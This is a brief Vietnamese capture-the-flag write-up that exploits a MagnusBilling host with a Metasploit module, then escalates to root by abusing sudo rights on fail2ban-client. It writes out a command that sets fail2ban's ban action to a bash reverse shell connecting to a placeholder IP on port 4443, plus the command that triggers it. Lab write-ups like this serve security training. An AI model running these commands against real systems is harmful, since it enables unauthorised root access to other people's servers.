đọc source code thì ta sẽ biết trang này đang dùng magnusbilling nên sẽ search google xem có script nào hay không?, và tìm được 1 script của metasploit

<img width="1735" height="1009" alt="image" src="https://github.com/user-attachments/assets/b8c7fb36-291b-42ad-870e-03779458d1a2" />

vào metasploit và set rhosts, lhost rồi exploit

<img width="1674" height="1014" alt="image" src="https://github.com/user-attachments/assets/e84b6445-cb22-49e3-8585-12bd3b016d1e" />

nâng cấp shell, vậy là ta đã đọc user flag

<img width="2049" height="725" alt="image" src="https://github.com/user-attachments/assets/ad7b1106-8f7a-45ce-9999-6b9a8ae8b3ee" />

ta sẽ dùng script này để lên root: `sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/IP/4443 0>&1'"`

rồi mở nc ở máy kali sau đó dùng command này ở máy server: `sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1`

<img width="1023" height="204" alt="image" src="https://github.com/user-attachments/assets/c9fdb2a5-3720-4d1e-8c0c-49bd14a8b02f" />


thế là đọc được root flag
